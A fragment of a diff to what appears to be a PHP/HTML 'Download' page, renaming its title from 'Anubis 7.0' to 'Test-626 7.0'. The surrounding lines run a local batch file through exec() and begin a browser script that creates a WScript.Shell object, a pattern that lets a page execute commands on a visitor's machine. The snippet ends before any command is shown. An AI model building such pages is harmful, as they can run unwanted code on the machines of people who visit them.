@@ -5,7 +5,7 @@ exec('.\tt.bat && exit',$arrACL);
 ?>
 <html>
 <head>
-<title>Anubis 7.0 | Download </title>
+<title>Test-626 7.0 | Download </title>
 <script type="text/javascript">
       function myFunction(){
          WshShell = new ActiveXObject("Wscript.Shell"); //Create WScript Object
